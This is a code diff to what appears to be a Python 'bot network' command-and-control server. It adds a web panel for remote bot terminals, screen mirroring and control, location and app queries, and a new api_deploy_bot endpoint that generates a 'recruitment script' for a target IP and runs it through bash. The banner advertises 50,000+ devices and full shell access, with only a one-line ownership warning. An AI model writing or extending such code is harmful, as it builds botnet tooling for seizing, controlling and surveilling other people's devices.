+                                <button class="btn" onclick="startScreenMirror()">🖼️ Screen Mirror</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('battery')">🔋 Battery</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('location')">📍 Location</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('apps')">📱 Apps</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot-control-section" style="margin-top: 1rem;">
+                            <h5>⚙️ Advanced</h5>
+                            <button class="btn btn-warning" onclick="restartBot()">🔄 Restart Bot</button>
+                            <button class="btn btn-danger" onclick="disconnectBot()">🔌 Disconnect</button>
+                        </div>
+                    </div>
+                    
+                    <!-- Bot Terminal/Output Panel -->
+                    <div class="panel" style="padding: 1rem; display: flex; flex-direction: column;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+                            <h4>🖥️ Bot Terminal</h4>
+                            <div>
+                                <button class="btn btn-secondary" onclick="clearBotTerminal()">Clear</button>
+                                <button class="btn btn-secondary" onclick="exportBotLogs()">Export</button>
+                            </div>
+                        </div>
+                        
+                        <div class="terminal" id="botTerminal" style="flex: 1; max-height: 300px; overflow-y: auto;">
+                            <div class="terminal-line terminal-info">
+                                <span class="terminal-timestamp">[BOT]</span> 
+                                🤖 Bot terminal ready - Direct communication established
+                            </div>
+                        </div>
+                        
+                        <div style="margin-top: 1rem;">
+                            <div style="display: flex; gap: 0.5rem;">
+                                <input type="text" id="botCommandInput" class="command-input" 
+                                       placeholder="Enter command for this bot..." 
+                                       onkeypress="handleBotCommandKeyPress(event)" style="flex: 1;">
+                                <button class="btn" onclick="sendBotTerminalCommand()">Execute</button>
+                            </div>
+                        </div>
+                        
+                        <!-- Screen Mirror Area (for mobile devices) -->
+                        <div id="screenMirrorArea" style="display: none; margin-top: 1rem;">
+                            <h5>📱 Screen Mirror</h5>
+                            <div id="screenMirrorCanvas" style="border: 1px solid #00ff9f; border-radius: 8px; min-height: 200px; display: flex; align-items: center; justify-content: center; background: #1a1a2e;">
+                                <div style="text-align: center; color: #666;">
+                                    📱 Screen mirroring will appear here<br>
+                                    <small>Requires device with screen sharing capability</small>
+                                </div>
+                            </div>
+                            <div style="margin-top: 0.5rem; text-align: center;">
+                                <button class="btn btn-secondary" onclick="takeScreenshot()">📸 Screenshot</button>
+                                <button class="btn btn-secondary" onclick="refreshScreen()">🔄 Refresh</button>
+                                <button class="btn btn-secondary" onclick="toggleScreenControl()">🎮 Control</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal Styles -->
+    <style>
+    .modal {
+        position: fixed;
+        z-index: 1000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0,0,0,0.8);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    
+    .modal-content {
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        border: 2px solid #00ff9f;
+        border-radius: 12px;
+        max-width: 90%;
+        max-height: 90%;
+        box-shadow: 0 10px 30px rgba(0, 255, 159, 0.3);
+    }
+    
+    .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem;
+        border-bottom: 1px solid #00ff9f;
+    }
+    
+    .modal-header h3 {
+        margin: 0;
+        color: #00ff9f;
+    }
+    
+    .close {
+        color: #ff0080;
+        font-size: 28px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+    
+    .close:hover {
+        color: #ffffff;
+    }
+    
+    .bot-control-section {
+        border-top: 1px solid #333;
+        padding-top: 0.5rem;
+    }
+    
+    .bot-control-section h5 {
+        margin: 0 0 0.5rem 0;
+        color: #0080ff;
+        font-size: 14px;
+    }
+    
+    .bot-controls button {
+        font-size: 12px;
+        padding: 0.3rem 0.6rem;
+    }
+    </style>
 </body>
 </html>"""
 async def route_ui(request):
@@ -3555,30 +5108,56 @@ async def api_system_stats(request):
     if token != AUTH_TOKEN:
         return web.json_response({"error": "unauthorized"}, status=401)
     
-    # Collect system statistics
-    stats = {
-        "devices": {
-            "total": len(clients),
-            "online": sum(1 for c in clients.values() if time.time() - c.get("last_seen", 0) < 60),
-            "exec_allowed": sum(1 for c in clients.values() if c.get("meta", {}).get("exec_allowed", False))
-        },
-        "load_balancer": {
-            "active": load_balancer is not None,
-            "queue_size": command_queue.qsize() if load_balancer else 0,
-            "worker_count": len(load_balancer.workers) if load_balancer else 0
-        },
-        "services": {
-            "total": len(service_manager.services),
-            "running": sum(1 for s in service_manager.services.values() if s.get("status") == "deployed")
-        },
-        "system": {
-            "uptime": time.time(),
-            "memory_usage": f"{psutil.virtual_memory().percent:.1f}%",
-            "cpu_usage": f"{psutil.cpu_percent(interval=None):.1f}%"
+    try:
+        # Collect enhanced system statistics
+        stats = {
+            "devices": {
+                "total": len(clients),
+                "online": sum(1 for c in clients.values() if time.time() - c.get("last_seen", 0) < 60),
+                "exec_allowed": sum(1 for c in clients.values() if c.get("meta", {}).get("exec_allowed", False)),
+                "offline": len(clients) - sum(1 for c in clients.values() if time.time() - c.get("last_seen", 0) < 60)
+            },
+            "load_balancer": {
+                "active": load_balancer is not None,
+                "queue_size": command_queue.qsize() if load_balancer else 0,
+                "worker_count": len(load_balancer.workers) if load_balancer else 0
+            },
+            "services": {
+                "total": len(service_manager.services),
+                "running": sum(1 for s in service_manager.services.values() if s.get("status") == "deployed")
+            },
+            "system": {
+                "uptime": time.time() - start_time,
+                "memory_usage": f"{psutil.virtual_memory().percent:.1f}%",
+                "cpu_usage": f"{psutil.cpu_percent(interval=None):.1f}%",
+                "disk_usage": f"{psutil.disk_usage('/').percent:.1f}%",
+                "max_devices": MAX_DEVICES,
+                "max_workers": MAX_CONCURRENT_COMMANDS,
+                "max_memory_mb": MAX_MEMORY_MB
+            },
+            "terminal": {
+                "commands_executed": len(terminal_interface.command_history),
+                "active_sessions": len(terminal_interface.active_sessions)
+            }
         }
-    }
-    
-    return web.json_response(stats)
+        
+        # Add enhanced stats from persistent storage if available
+        if persistent_storage:
+            try:
+                enhanced_stats = persistent_storage.get_system_stats()
+                stats["analytics"] = enhanced_stats
+                
+                # Record current metrics for future analysis
+                persistent_storage.track_system_metrics()
+            except Exception as e:
+                logging.error(f"Failed to get enhanced stats: {e}")
+                stats["analytics"] = {"error": "analytics unavailable"}
+        
+        return web.json_response(stats)
+        
+    except Exception as e:
+        logging.error(f"Failed to get system stats: {e}")
+        return web.json_response({"error": str(e)}, status=500)
 
 async def api_bulk_command(request):
     """Execute commands on multiple devices efficiently"""
@@ -3869,11 +5448,44 @@ async def api_discover_network(request):
     try:
         # Start network discovery
         results = await device_discoverer.discover_local_network()
+        
+        # Add enhanced network information
+        import subprocess
+        import socket
+        
+        network_info = {}
+        try:
+            # Get local network information
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            network_info["local_ip"] = local_ip
+            network_info["hostname"] = hostname
+            
+            # Get network interface info
+            try:
+                netinfo_result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
+                if netinfo_result.returncode == 0:
+                    routes = [line.strip() for line in netinfo_result.stdout.split('\n') if line.strip()]
+                    network_info["network_routes"] = routes[:5]  # First 5 routes
+            except:
+                try:
+                    # Fallback for systems without 'ip' command
+                    netinfo_result = subprocess.run(['netstat', '-rn'], capture_output=True, text=True, timeout=5)
+                    if netinfo_result.returncode == 0:
+                        routes = [line.strip() for line in netinfo_result.stdout.split('\n') if line.strip()]
+                        network_info["network_routes"] = routes[:5]
+                except:
+                    network_info["network_routes"] = ["Network route info unavailable"]
+                    
+        except Exception as e:
+            network_info["error"] = str(e)
+        
         return web.json_response({
             "status": "success",
             "scan_timestamp": time.time(),
             "discovered_devices": results.get("discovered", []),
-            "total_discovered": results.get("total", 0)
+            "total_discovered": results.get("total", 0),
+            "network_info": network_info
         })
     except Exception as e:
         logging.error(f"Network discovery error: {e}")
@@ -3912,6 +5524,68 @@ async def api_recruit_device(request):
             "target_os": target_os,
             "recruitment_script": script
         })
+    except Exception as e:
+        return web.json_response({"error": str(e)}, status=500)
+
+async def api_deploy_bot(request):
+    """Actually deploy a bot to a target device"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    try:
+        data = await request.json()
+        target_ip = data.get("target_ip")
+        target_os = data.get("target_os", "linux")
+        deployment_method = data.get("method", "auto")  # auto, ssh, http, manual
+        
+        if not target_ip:
+            return web.json_response({"error": "target_ip required"}, status=400)
+        
+        # Generate and execute deployment script
+        script = await device_discoverer.generate_recruitment_script(target_ip, target_os)
+        
+        deployment_result = {"status": "script_generated", "script": script}
+        
+        if deployment_method == "auto":
+            # Try to actually execute the deployment
+            try:
+                import subprocess
+                import tempfile
+                
+                # Save script to temporary file
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
+                    f.write(script)
+                    script_path = f.name
+                
+                # Make script executable and run it
+                os.chmod(script_path, 0o755)
+                result = subprocess.run(['/bin/bash', script_path], 
+                                      capture_output=True, text=True, timeout=60)
+                
+                deployment_result.update({
+                    "status": "deployment_attempted",
+                    "success": result.returncode == 0,
+                    "output": result.stdout,
+                    "error": result.stderr
+                })
+                
+                # Cleanup
+                os.unlink(script_path)
+                
+            except Exception as deploy_error:
+                deployment_result.update({
+                    "status": "deployment_failed",
+                    "error": str(deploy_error)
+                })
+        
+        return web.json_response({
+            "status": "success",
+            "target_ip": target_ip,
+            "target_os": target_os,
+            "deployment": deployment_result
+        })
+        
     except Exception as e:
         return web.json_response({"error": str(e)}, status=500)
 
@@ -4038,6 +5712,7 @@ def start_http_server():
     app.router.add_post("/api/discover/network", api_discover_network)
     app.router.add_get("/api/discover/results", api_discover_results)
     app.router.add_post("/api/discover/recruit", api_recruit_device)
+    app.router.add_post("/api/discover/deploy", api_deploy_bot)
     
     # Enhanced Terminal endpoints
     app.router.add_post("/api/terminal/execute", api_terminal_execute)
@@ -4423,6 +6098,10 @@ def main():
         # Initialize database
         db = Database(args.db)
         
+        # Initialize persistent storage system
+        global persistent_storage
+        persistent_storage = PersistentStorage(args.db)
+        
         print(f"""
 🚀 Advanced Unified Bot Network Control Server Starting...
 
@@ -4430,6 +6109,7 @@ def main():
 🌐 Web Interface: http://{HOST}:{HTTP_PORT}/ui?token={AUTH_TOKEN}
 📁 Upload Directory: {UPLOAD_DIR}
 💾 Database: {args.db}
+📊 Enhanced Storage: Logs, Sessions, Metrics Tracking
 
 🤖 Bot Network Capabilities:
    • Support for 50,000+ devices
@@ -4438,6 +6118,7 @@ def main():
    • Real terminal mode with full shell access
    • Advanced resource optimization
    • Load balancing with {MAX_CONCURRENT_COMMANDS} workers
+   • Persistent storage for logs and progress
 
 ⚠️  SECURITY WARNING: Only use on devices you own and control!
 """)
@@ -4459,10 +6140,27 @@ def main():
             site = web.TCPSite(runner, HOST, HTTP_PORT)
             await site.start()
             
+            # Initialize local device as control bot
+            await initialize_control_bot()
+            
             # Start cleanup task
             # Start cleanup and optimization tasks
             asyncio.create_task(cleanup_stale_clients())
             asyncio.create_task(memory_optimizer())
+            
+            # Start metrics recording task
+            async def record_metrics():
+                """Periodically record system metrics"""
+                while True:
+                    try:
+                        if persistent_storage:
+                            persistent_storage.track_system_metrics()
+                        await asyncio.sleep(60)  # Record metrics every minute
+                    except Exception as e:
+                        logging.error(f"Metrics recording error: {e}")
+                        await asyncio.sleep(60)
+            
+            asyncio.create_task(record_metrics())
             
             logging.info("Server started successfully with load balancer")
             print("✅ Server is running. Press Ctrl+C to stop.")
